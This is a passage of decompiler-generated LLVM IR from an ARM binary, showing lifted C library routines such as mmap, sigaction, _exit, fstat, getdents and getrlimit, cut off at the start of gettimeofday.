  %v0_16bf0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16bf0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_16be8
  %v2_16bf0 = load i32, i32* @r8, align 4
  %v8_16bf4 = shl i32 %v2_16bf0, %v1_16bec
  %v9_16bf4 = and i32 %v8_16bf4, %v1_16bec
  %v8_16bf8 = lshr i32 %v2_16bf0, %v9_16bf4
  %v9_16bf8 = and i32 %v8_16bf8, %v9_16bf4
  %v2_16bfc = inttoptr i32 %v9_16bf8 to i64*
  %v3_16bfc = load i64, i64* %v2_16bfc, align 4
  %v4_16bfc = load i32, i32* %ip.global-to-local, align 4
  %v5_16bfc = trunc i64 %v3_16bfc to i32
  %v6_16bfc = udiv i64 %v3_16bfc, 4294967296
  %v7_16bfc = trunc i64 %v6_16bfc to i32
  store i32 %v5_16bfc, i32* %r1.global-to-local, align 4
  %v9_16bfc = sub i32 %v7_16bfc, %v4_16bfc
  %v1_16c00 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c00 = mul i32 %v9_16bfc, %v1_16c00
  %v5_16c08 = mul i32 %v1_16c00, 4
  %v6_16c08 = and i32 %v5_16c08, %v3_16c00
  %v5_16c0c = udiv i32 %v1_16c00, 2
  %v6_16c0c = and i32 %v6_16c08, %v5_16c0c
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_16c0c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16be8, %bb85
  %v5_16c10 = phi i32 [ %v1_16bec, %dec_label_pc_16be8 ], [ %v6_16c0c, %bb85 ]
  ret i32 %v5_16c10

; uselistorder directives
  uselistorder i32 %v1_16c00, { 1, 0, 2 }
  uselistorder i32 %v1_16bec, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_16ba0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16b9c, { 1, 0, 2 }
  uselistorder i32 %v1_16b80.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16b6c, { 1, 0 }
  uselistorder i32 %v2_16acc, { 1, 0 }
  uselistorder i32 %v2_16aa4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_16a98, { 1, 0 }
  uselistorder i32 %v1_16a94, { 3, 2, 1, 0 }
  uselistorder i32 %v1_16a88, { 1, 0 }
  uselistorder i32 %v1_16a54, { 1, 0 }
  uselistorder i32 %v1_16a50, { 1, 2, 3, 0 }
  uselistorder i32 %v1_16a44, { 1, 0 }
  uselistorder i32 %v2_16a20, { 1, 0, 2 }
  uselistorder i32 %v4_16a04, { 1, 0, 2 }
  uselistorder i32 %v4_169f4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1693c, { 1, 2, 0 }
  uselistorder i32 %v2_16908, { 1, 2, 0 }
  uselistorder i32 %v1_16904, { 1, 2, 0 }
  uselistorder i1 %v2_168f0, { 1, 0, 2 }
  uselistorder i32 %v5_168f4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_168c0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_168a8, { 1, 0, 2 }
  uselistorder i32 %v2_1689c, { 1, 0, 2 }
  uselistorder i32 %v3_1686c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 3, 1, 2, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 3, 9, 10, 11, 12, 0, 13, 14, 1, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 2, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1, 3 }
  uselistorder i32 120, { 0, 2, 1, 4, 3 }
  uselistorder i32 2012, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_16be8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16ba0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16b88, { 1, 0 }
  uselistorder label %dec_label_pc_16af0, { 1, 0 }
  uselistorder label %dec_label_pc_16ac8, { 1, 0 }
  uselistorder label %dec_label_pc_16a44, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_169c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16998, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_16908, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_168f0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16c3c = load i32, i32* @r4, align 4
  store i32 %v3_16c3c, i32* %stack_var_-16, align 4
  %v3_16c48 = urem i32 %arg3, 4096
  %v2_16c4c = icmp eq i32 %v3_16c48, 0
  br i1 %v2_16c4c, label %dec_label_pc_16c70, label %dec_label_pc_16c54

dec_label_pc_16c54:                               ; preds = %entry
  %v0_16c58 = call i32 @__aeabi_read_tp()
  store i32 %v0_16c58, i32* %r0.global-to-local, align 4
  %v3_16c5c = load i16, i16* @global_var_244d0.762, align 2
  %v4_16c5c = sext i16 %v3_16c5c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16c68 = add i32 %v4_16c5c, %v0_16c58
  %v4_16c68 = inttoptr i32 %v3_16c68 to i32*
  store i32 22, i32* %v4_16c68, align 4
  %v0_16ca4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ca4

dec_label_pc_16c70:                               ; preds = %entry
  %v0_16c80 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16c80, -4095
  br i1 %tmp, label %dec_label_pc_16ca0, label %dec_label_pc_16c88

dec_label_pc_16c88:                               ; preds = %dec_label_pc_16c70
  %v1_16c8c = sub i32 0, %v0_16c80
  %v3_16c90 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16c90 = sext i16 %v3_16c90 to i32
  %v0_16c94 = call i32 @__aeabi_read_tp()
  %v3_16c98 = add i32 %v4_16c90, %v0_16c94
  %v4_16c98 = inttoptr i32 %v3_16c98 to i32*
  store i32 %v1_16c8c, i32* %v4_16c98, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ca0

dec_label_pc_16ca0:                               ; preds = %dec_label_pc_16c70, %dec_label_pc_16c88
  %v0_16ca0 = phi i32 [ %v0_16c80, %dec_label_pc_16c70 ], [ -1, %dec_label_pc_16c88 ]
  store i32 %v0_16ca0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ca4

dec_label_pc_16ca4:                               ; preds = %dec_label_pc_16c54, %dec_label_pc_16ca0
  %v0_16ca4 = phi i32 [ %v0_16ca4.pre, %dec_label_pc_16c54 ], [ %v0_16ca0, %dec_label_pc_16ca0 ]
  store i32 %v0_16ca4, i32* %r0.global-to-local, align 4
  %v2_16ca8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16ca8, i32* @r4, align 4
  ret i32 %v0_16ca4

; uselistorder directives
  uselistorder i32 %v0_16ca4, { 1, 0 }
  uselistorder i32 %v0_16c80, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_16ca4, { 1, 0 }
  uselistorder label %dec_label_pc_16ca0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_16cb8 = load i32, i32* @lr, align 4
  store i32 %v0_16cb8, i32* %stack_var_-4, align 4
  %v0_16cc0 = load i32, i32* @r0, align 4
  %v3_16cc4 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16cc4 = sext i16 %v3_16cc4 to i32
  store i32 %v4_16cc4, i32* @r2, align 4
  %v0_16cc8 = call i32 @__aeabi_read_tp()
  %v1_16ccc = sub i32 0, %v0_16cc0
  store i32 %v1_16ccc, i32* @r3, align 4
  %v2_16cd0 = load i32, i32* @r2, align 4
  %v3_16cd0 = add i32 %v2_16cd0, %v0_16cc8
  %v4_16cd0 = inttoptr i32 %v3_16cd0 to i32*
  store i32 %v1_16ccc, i32* %v4_16cd0, align 4
  %v2_16cd8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_16cd8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16ce4 = load i32, i32* @r4, align 4
  %v6_16ce4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_16cec = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_16cec, label %dec_label_pc_16d40, label %dec_label_pc_16d04

dec_label_pc_16d04:                               ; preds = %entry
  %v1_16d04 = add i32 %arg2, 4
  %v2_16d04 = inttoptr i32 %v1_16d04 to i32*
  %v3_16d04 = load i32, i32* %v2_16d04, align 4
  store i32 %v3_16d04, i32* @r3, align 4
  %v1_16d08 = and i32 %v3_16d04, 67108864
  %v2_16d08 = icmp eq i32 %v1_16d08, 0
  br i1 %v2_16d08, label %dec_label_pc_16d10, label %dec_label_pc_16d40

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16d04
  store i32 20, i32* @r2, align 4
  %v2_16d14 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16d14, i32* @r0, align 4
  %v0_16d18 = call i32 @memcpy()
  store i32 %v2_16d14, i32* @ip, align 4
  %v0_16d40.pre = load i32, i32* @r5, align 4
  %v0_16d48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16d40

dec_label_pc_16d40:                               ; preds = %dec_label_pc_16d04, %entry, %dec_label_pc_16d10
  %v0_16d48 = phi i32 [ %arg3, %dec_label_pc_16d04 ], [ %arg3, %entry ], [ %v0_16d48.pre, %dec_label_pc_16d10 ]
  %v0_16d44 = phi i32 [ %arg2, %dec_label_pc_16d04 ], [ 0, %entry ], [ %v2_16d14, %dec_label_pc_16d10 ]
  %v0_16d40 = phi i32 [ %arg1, %dec_label_pc_16d04 ], [ %arg1, %entry ], [ %v0_16d40.pre, %dec_label_pc_16d10 ]
  %v4_16d50 = call i32 @__syscall_rt_sigaction(i32 %v0_16d40, i32 %v0_16d44, i32 %v0_16d48, i32 8)
  store i32 %v3_16ce4, i32* @r4, align 4
  store i32 %v6_16ce4, i32* @r5, align 4
  ret i32 %v4_16d50

; uselistorder directives
  uselistorder i32 67108864, { 1, 0 }
  uselistorder label %dec_label_pc_16d40, { 2, 0, 1 }
}

define i32 @function_16d64(i32 %arg1) local_unnamed_addr {
dec_label_pc_16d64:
  %v0_16d64 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16d64, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16d64
  %v2_16d64 = load i32, i32* @r8, align 4
  %v4_16d64 = mul i32 %v2_16d64, 2
  %v5_16d64 = and i32 %v4_16d64, %arg1
  %v2_16d68 = load i32, i32* @ip, align 4
  %v4_16d68 = lshr i32 %v2_16d68, %v5_16d64
  %v5_16d68 = sub i32 32, %v5_16d64
  %v6_16d68 = shl i32 %v2_16d68, %v5_16d68
  %v7_16d68 = or i32 %v6_16d68, %v4_16d68
  %v9_16d68 = and i32 %v7_16d68, %v5_16d64
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16d64, %bb
  %v10_16d68 = phi i32 [ %arg1, %dec_label_pc_16d64 ], [ %v9_16d68, %bb ]
  ret i32 %v10_16d68

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_16d70 = call i32 @__sigsetjmp()
  ret i32 %v0_16d70
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16da0 = load i32, i32* @r7, align 4
  store i32 %v3_16da0, i32* %stack_var_-8, align 4
  %v0_16dac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16dac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16dac, -4095
  br i1 %tmp, label %dec_label_pc_16dd4, label %dec_label_pc_16dbc

dec_label_pc_16dbc:                               ; preds = %entry
  %v0_16dc0 = call i32 @__aeabi_read_tp()
  %v3_16dc4 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16dc4 = sext i16 %v3_16dc4 to i32
  %v0_16dc8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16dc8 = sub i32 0, %v0_16dc8
  store i32 %v1_16dc8, i32* %r2.global-to-local, align 4
  %v3_16dcc = add i32 %v4_16dc4, %v0_16dc0
  %v4_16dcc = inttoptr i32 %v3_16dcc to i32*
  store i32 %v1_16dc8, i32* %v4_16dcc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16dd4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16dd4

dec_label_pc_16dd4:                               ; preds = %entry, %dec_label_pc_16dbc
  %v1_16dd8 = phi i32 [ %v0_16dac, %entry ], [ -1, %dec_label_pc_16dbc ]
  %v2_16dd4 = phi i32 [ %v3_16da0, %entry ], [ %v2_16dd4.pre, %dec_label_pc_16dbc ]
  store i32 %v2_16dd4, i32* @r7, align 4
  ret i32 %v1_16dd8

; uselistorder directives
  uselistorder i32 %v0_16dac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16dd4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dec

dec_label_pc_16dec:                               ; preds = %dec_label_pc_16e18, %dec_label_pc_16e2c, %entry
  %v0_16dec = phi i32 [ %arg1, %entry ], [ %v0_16dec.pre.pre, %dec_label_pc_16e2c ], [ %v0_16e18, %dec_label_pc_16e18 ]
  store i32 %v0_16dec, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16dec, -4095
  br i1 %tmp, label %dec_label_pc_16e18, label %dec_label_pc_16e08

dec_label_pc_16e08:                               ; preds = %dec_label_pc_16dec
  %v0_16e08 = call i32 @__aeabi_read_tp()
  %v0_16e0c = load i32, i32* %r2.global-to-local, align 4
  %v1_16e0c = sub i32 0, %v0_16e0c
  store i32 %v1_16e0c, i32* %r2.global-to-local, align 4
  %v3_16e10 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16e10 = sext i16 %v3_16e10 to i32
  %v3_16e14 = add i32 %v4_16e10, %v0_16e08
  %v4_16e14 = inttoptr i32 %v3_16e14 to i32*
  store i32 %v1_16e0c, i32* %v4_16e14, align 4
  %v0_16e18.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e18

dec_label_pc_16e18:                               ; preds = %dec_label_pc_16dec, %dec_label_pc_16e08
  %v0_16e18 = phi i32 [ %v0_16dec, %dec_label_pc_16dec ], [ %v0_16e18.pre, %dec_label_pc_16e08 ]
  store i32 %v0_16e18, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_16e18, -4095
  br i1 %tmp4, label %dec_label_pc_16dec, label %dec_label_pc_16e2c

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e18
  %v0_16e2c = call i32 @__aeabi_read_tp()
  %v0_16e30 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e30 = sub i32 0, %v0_16e30
  store i32 %v1_16e30, i32* %r2.global-to-local, align 4
  %v3_16e34 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16e34 = sext i16 %v3_16e34 to i32
  %v3_16e38 = add i32 %v4_16e34, %v0_16e2c
  %v4_16e38 = inttoptr i32 %v3_16e38 to i32*
  store i32 %v1_16e30, i32* %v4_16e38, align 4
  %v0_16dec.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16dec

; uselistorder directives
  uselistorder i32 %v0_16e18, { 0, 2, 1 }
  uselistorder i32 %v0_16dec, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16e18, { 1, 0 }
  uselistorder label %dec_label_pc_16dec, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_16e50 = load i32, i32* @r1, align 4
  store i32 %v0_16e50, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_16e60 = load i32, i32* @r0, align 4
  store i32 %v0_16e60, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_16e60, -4095
  br i1 %tmp, label %dec_label_pc_16e88, label %dec_label_pc_16e6c

dec_label_pc_16e6c:                               ; preds = %entry
  %v0_16e70 = call i32 @__aeabi_read_tp()
  %v3_16e74 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16e74 = sext i16 %v3_16e74 to i32
  store i32 %v4_16e74, i32* @r3, align 4
  %v0_16e78 = load i32, i32* @r2, align 4
  %v1_16e78 = sub i32 0, %v0_16e78
  store i32 %v1_16e78, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_16e80 = add i32 %v4_16e74, %v0_16e70
  %v4_16e80 = inttoptr i32 %v3_16e80 to i32*
  store i32 %v1_16e78, i32* %v4_16e80, align 4
  br label %dec_label_pc_16e98

dec_label_pc_16e88:                               ; preds = %entry
  store i32 %v0_16e60, i32* %r7.global-to-local, align 4
  %v2_16e88 = icmp eq i32 %v0_16e60, 0
  br i1 %v2_16e88, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_16e88
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16e88, %bb
  call void @__pseudo_cond_branch(i1 %v2_16e88, i32 ptrtoint (i32* @global_var_172d8.995 to i32))
  br label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16e6c, %.thread
  %v0_16e98 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_16e98

; uselistorder directives
  uselistorder i32 %v0_16e60, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16e98, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_16eac = load i32, i32* @r5, align 4
  %v18_16eac = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16ee4, label %dec_label_pc_16ec8

dec_label_pc_16ec8:                               ; preds = %entry
  %v1_16ecc = sub i32 0, %arg1
  %v3_16ed0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16ed0 = sext i16 %v3_16ed0 to i32
  store i32 %v4_16ed0, i32* %r3.global-to-local, align 4
  %v0_16ed4 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_16edc = add i32 %v4_16ed0, %v0_16ed4
  %v4_16edc = inttoptr i32 %v3_16edc to i32*
  store i32 %v1_16ecc, i32* %v4_16edc, align 4
  br label %dec_label_pc_16f38

dec_label_pc_16ee4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_16ee4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_16eec = add i32 %arg2, %arg1
  store i32 %v3_16eec, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16ee4, %bb
  %v1_16f284 = phi i32 [ %v18_16eac, %dec_label_pc_16ee4 ], [ %v3_16eec, %bb ]
  %v0_16f242 = phi i32 [ 141, %dec_label_pc_16ee4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_16f38, label %dec_label_pc_16f24

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16f24
  %v1_16f2c = inttoptr i32 %v1_16f24 to i8*
  %v1_16ef8 = add i32 %v0_16ef8, 8
  %v2_16ef8 = inttoptr i32 %v1_16ef8 to i16*
  %v3_16ef8 = load i16, i16* %v2_16ef8, align 2
  %v4_16ef8 = zext i16 %v3_16ef8 to i32
  %v2_16efc = add i32 %v4_16ef8, %v0_16ef8
  store i32 %v2_16efc, i32* @r3, align 4
  %v1_16f00 = add i32 %v2_16efc, -1
  %v2_16f00 = inttoptr i32 %v1_16f00 to i8*
  %v3_16f00 = load i8, i8* %v2_16f00, align 1
  %v4_16f00 = zext i8 %v3_16f00 to i32
  store i32 %v4_16f00, i32* @r4, align 4
  %v3_16f04 = call i32 @strlen(i8* %v1_16f2c)
  %v0_16f08 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16f08, i32* @r1, align 4
  %v1_16f0c = add i32 %v3_16f04, 1
  store i32 %v1_16f0c, i32* @r2, align 4
  %v0_16f10 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_16f10, i32* @r0, align 4
  %v3_16f14 = call i32 @memmove(i32 %v0_16f10, i32 %v0_16f08, i32 %v1_16f0c)
  %v0_16f18 = load i32, i32* %r7.global-to-local, align 4
  %v1_16f18 = add i32 %v0_16f18, 8
  %v2_16f18 = inttoptr i32 %v1_16f18 to i16*
  %v3_16f18 = load i16, i16* %v2_16f18, align 2
  %v4_16f18 = zext i16 %v3_16f18 to i32
  store i32 %v4_16f18, i32* %r3.global-to-local, align 4
  %v0_16f1c = load i32, i32* @r4, align 4
  %v1_16f1c = trunc i32 %v0_16f1c to i8
  %v3_16f1c = add i32 %v0_16f18, 10
  %v4_16f1c = inttoptr i32 %v3_16f1c to i8*
  store i8 %v1_16f1c, i8* %v4_16f1c, align 1
  %v0_16f20 = load i32, i32* %r7.global-to-local, align 4
  %v1_16f20 = load i32, i32* %r3.global-to-local, align 4
  %v2_16f20 = add i32 %v1_16f20, %v0_16f20
  store i32 %v2_16f20, i32* %r7.global-to-local, align 4
  %v1_16f28.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_16f24

dec_label_pc_16f24:                               ; preds = %.thread, %dec_label_pc_16ef8
  %v1_16f28 = phi i32 [ %v1_16f28.pre, %dec_label_pc_16ef8 ], [ %v1_16f284, %.thread ]
  %v0_16ef8 = phi i32 [ %v2_16f20, %dec_label_pc_16ef8 ], [ %v0_16f242, %.thread ]
  %v1_16f24 = add i32 %v0_16ef8, 10
  store i32 %v1_16f24, i32* %r6.global-to-local, align 4
  %v3_16f28 = icmp ult i32 %v0_16ef8, %v1_16f28
  %v1_16f30 = add i32 %v0_16ef8, 11
  store i32 %v1_16f30, i32* %r8.global-to-local, align 4
  br i1 %v3_16f28, label %dec_label_pc_16ef8, label %dec_label_pc_16f38

dec_label_pc_16f38:                               ; preds = %dec_label_pc_16f24, %.thread, %dec_label_pc_16ec8
  %v0_16f38 = load i32, i32* @r5, align 4
  store i32 %v6_16eac, i32* @r5, align 4
  store i32 %v18_16eac, i32* @sl, align 4
  ret i32 %v0_16f38

; uselistorder directives
  uselistorder i32 %v1_16f24, { 1, 0 }
  uselistorder i32 %v0_16ef8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_16eac, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_16f24, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16f50 = ptrtoint i32* %stack_var_-16 to i32
  %v2_16f5c = call i32 @getrlimit(i32 7, i32 %v2_16f50)
  %v1_16f60 = icmp slt i32 %v2_16f5c, 0
  %v5_16f64 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_16f60, i32 256, i32 %v5_16f64
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16f88 = load i32, i32* @r0, align 4
  ret i32 %v1_16f88
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_16f9c = load i32, i32* @r0, align 4
  ret i32 %v1_16f9c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16fb0 = load i32, i32* @r0, align 4
  ret i32 %v1_16fb0
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_16fc0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 148) to i32*), align 4
  %v1_16fc4 = inttoptr i32 %v4_16fc0 to i32*
  %v2_16fc4 = load i32, i32* %v1_16fc4, align 4
  %v2_16fc8 = icmp eq i32 %v2_16fc4, 0
  br i1 %v2_16fc8, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_16fd0 = phi i32 [ %v2_16fc4, %entry ], [ 4096, %bb ]
  ret i32 %v1_16fd0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17008, label %dec_label_pc_16ff0

dec_label_pc_16ff0:                               ; preds = %entry
  %v1_16ff4 = sub i32 0, %arg1
  %v3_16ff8 = load i16, i16* @global_var_244d0.762, align 2
  %v4_16ff8 = sext i16 %v3_16ff8 to i32
  %v0_16ffc = call i32 @__aeabi_read_tp()
  %v3_17000 = add i32 %v4_16ff8, %v0_16ffc
  %v4_17000 = inttoptr i32 %v3_17000 to i32*
  store i32 %v1_16ff4, i32* %v4_17000, align 4
  br label %dec_label_pc_17008

dec_label_pc_17008:                               ; preds = %entry, %dec_label_pc_16ff0
  %v1_1700c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16ff0 ]
  ret i32 %v1_1700c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17008, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
